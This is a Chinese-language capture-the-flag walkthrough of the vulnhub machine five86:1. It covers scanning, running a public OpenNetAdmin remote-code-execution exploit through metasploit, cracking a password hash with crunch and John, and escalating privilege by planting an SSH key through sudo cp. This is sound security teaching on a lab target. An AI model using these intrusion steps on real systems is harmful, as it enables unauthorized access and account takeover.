**什么是靶机**

  

学习网安攻防技术一定离不开靶机的练习。在网络安全中，靶机是指一个存在漏洞的系统，互联网上所有的网站（系统）都可以说是“靶机”，但是不能直接对未授权的网站（系统）进行测试。于是就出现了靶机，i春秋（https://www.ichunqiu.com/）平台也有很多关于靶场学习的课程，欢迎大家前来练习。

  

![](../Images/66bc3de75aaf6c837c7f6c01af7ccca8.png)

  

今天i春秋分享的是**从0到1靶机实战系列之five86:1**，本次实验的靶机来自vulnhub，名称为five86:1，难度在中等偏上，适用于企业中从事安全研究人员对kali以及Linux ssh无验证登录等利用的熟悉程度。

  

注：i 春秋公众号旨在为大家提供更多的学习方法与技能技巧，文章仅供学习参考。

![](../Images/a424757528e7dba6d6b1c61119fccca4.png)

首先把靶机文件导入到虚拟机中，网络模式设置为**NAT**，然后使用**netdiscover**找到靶机的IP。  

  

![](../Images/359dfdee42a82cf7439a6ac8e4063553.png)

  

![](../Images/e1500d51f890b42b448d3b6be3c89eab.png)

  

当然使用nmap也是可以的。

  

**Nmap -A 192.\*\*\*/24**

  

可以发现该网段下所有主机和一些基本的信息：

  

![](../Images/a75dbc3d91246d41ccb50d7aedc24802.png)

  

开放了三个端口，分别是22，80和1000（这个1000端口下其实没啥有用的东西，差不多是个幌子）

  

我们还是访问一下80端口，看看有什么：

  

![](../Images/f587011d2435a14a67f26b9b60c5f93c.png)

直接访问的话首页是空的，查看源代码也看不到任何内容，不过我们刚才用nmap扫这个IP的时候，看到根目录下其实是有一个robots.txt文件的，访问后得到一个目录ona。

  

![](../Images/774eb1f37f958b479e8227b404e387d6.png)

这里可以看出搭建了一个opennetadmin服务，提示我们是guest账户登陆。

  

![](../Images/f2e7e6a66f1d386c3feac2360c477d38.png)

知道了搭建的服务名称，那么我们可以到exploit-db找一下看看有没有相关已公开的exp。

  

从exploit-db搜索到了两个可用的exp，一个是metasploit版本的rb文件，另一个是Linux脚本文件。  

  

![](../Images/261de654be0c4c2021b27c580ad3adbb.png)

  

这两个都是可以使用的，这里我分别列出两种简单的使用方法。

  

Linux shell 版  

![](../Images/9fe9ebae503a12169fa619c6cdfd73ee.png)

  

首先从exploit-db上复制这个rb文件到本地并保存为exp.sh（名字随意，只要没有中文就行），然后使用chmod +x exp.sh或chmod 755 exp.sh设置权限。  

  

![](../Images/5dec1604ac85d1167232f4fc0f4bb290.png)

  

接着运行./exp.sh http://192.168.26.146/ona 得到shell。

  

![](../Images/804a3c0a6458a5ceabb185dca4b3eb65.png)

  

metasploit版  

![](../Images/9fe9ebae503a12169fa619c6cdfd73ee.png)

  

kali中内置了一个用于查找exp的工具searchsploit，使用**searchsploit opennetadmin**搜索到三个可用exp。  

  

![](../Images/898faa8a9aa57170672308aee3f631ba.png)

  

这里需要注意的是，不清楚什么原因，搜索到的.sh文件并不能够直接运行，会报错，只能复制内容到新文件才可以。从搜索结果可以看到exp的文件路径，在metasploit的exploits文件夹下新建一个文件夹opennetadmin，然后使用：

  

*   

```

```

  

把exp复制到metasploit下，因为metasploit本身没有内置这个exp，所以我们只能使用这种方式把exp添加到metasploit的库中。

  

![](../Images/0c4826c29a4695806d8a5f6824708ce1.png)

  

接下来启动**msfconsole**

  

**search opennetadmin**搜索我们刚创建的exp文件夹

  

![](../Images/82cca17b8496e6e37637ece2fbcb294d.png)

  

使用**use /exploits/opennetadmin/exp**应用该实例，show options查看一下需要设置的参数。

  

![](../Images/5d5e44a4fdef9620a61badea03ad3997.png)

  

我们只需要设置目标IP rhost以及本地IP lhost即可。

*   
*   
*   

```
set rhost 192.168.26.146
Set lhost 192.168.26.138 (kali的IP)
```

![](../Images/7dd742502327cc42f60913d5a11ebb71.png)

  

Run开启exp即可成功建立一个session。

  

![](../Images/8e9d4368c94d70b128fe35f1d03d9934.png)

  

shell进入，看一下id为www-data。

  

![](../Images/27aa2d258db04947c0baa876a56fc16a.png)

  

然后搜索一下有哪些文件是当前账户可以查看到的。

  

**find / -type f -user www-data**

  

![](../Images/ad907ad86d5cf9759e1c5e200e2d3503.png)

  

从搜索结果中看到我们对**var/www/html/reports/.htaccess**是有权限的，cat查看一下文件内容。

  

![](../Images/967a1f4a92042310bede7eee08db04ea.png)

  

从.htaccess文件得到另一个文件地址。

  

这里是一个提示，给出了一个用户名Douglas和一个加密后的密码，而且密码是由aefhrt组成的十位字符串。

  

![](../Images/2554570980cb5b5bd94c8a4c3cac1fbd.png)

  

我们可以使用kali中的crunch工具先生成一个密码字典。

  

**crunch 10 10 aefhrt > password.txt**

  

password.txt中就是由aefhrt组成的全部十位字符串。

  

![](../Images/d08d68e5af35b989a9f6e2c0f242d5f6.png)

  

然后使用John the ripper(jtr)这款工具进行比对测试用户密码。

  

**john —wordlist=password.txt hash.txt**

  

几分钟后我们得到了Douglas的密码fatherrrrr。

  

![](../Images/a15a3049c7a8c29d24255b1da571d63c.png)

  

有了账号密码，我的第一反应是ssh，试了一下，成功登录douglas。

  

![](../Images/8b2192b37e0517643d28d1b6106c658d.png)

  

Sudo -l 看一下当前账号的权限，发现对jen这个用户我们只能使用cp也就是复制功能，对于jen这个用户的文件我们没有任何读的权限，但是请注意，这里我发现jen其实是允许无密码登录的，也就是说我们可以使用ssh密钥直接登录到这个账号。

  

![](../Images/516de20bf1c04cc29e6a5b3503987816.png)

  

但是jen目录下没有.ssh这个文件夹，也没有密钥文件，所以我们需要重新生成并把密钥文件复制到jen用户目录下，而且jen用户对Douglas这个用户文件没有操作权限，所以不能直接复制Douglas的ssh文件，需要把它放到二者都有权限的/tmp临时目录中去。

  

**ssh-keygen -b 2048**生成一个ssh密钥

  

![](../Images/e295232aa2bd51414591ba2efdfda65b.png)

  

**cp .ssh/id\_rsa.pub /tmp/authorized\_keys**

  

切到tmp文件夹，把文件复制到jen/下

  

**sudo -u jen /bin/cp authorized\_keys /home/jen/.ssh/**

  

到这里基本上Douglas的任务就完成啦

  

我们连接到Jen

  

![](../Images/6e43dd3c30f2c11a20734548ba9644fd.png)

  

刚进来就提示我们有一封新邮件，mail查看一下邮件内容。  

  

![](../Images/584aaf0c46c7ef25d9b0252348373747.png)

  

这里其实提示的很明显了，就是说moss这个用户的密码被修改为Fire!Fire!了，那我们就直接登录moss。

  

![](../Images/a1eade76a53ebb31f82a8fde3fef8e6d.png)

  

进入到moss账户，ls -la一下发现个隐藏文件夹game。

  

![](../Images/e280588ef4cabfbf586819e88ae3f0e3.png)

  

进入后运行upyourgame脚本

  

![](../Images/b7d3b15c9b024c80083b3160cdc8d9e9.png)

  

看下ID确实是root权限，然后直奔/root/flag.txg，完成挑战！

  

![](../Images/470f7596660ee6c365079c8e43cbc59e.png)

  

总的来说这个靶机还是有一定难度的，尤其是提权那一块，后来跟作者请教了一下，提示“**不要想着从jen里获取到东西，要想办法把东西扔到jen文件夹里**”这才茅塞顿开，顺利解开题目，非常不错的靶机。
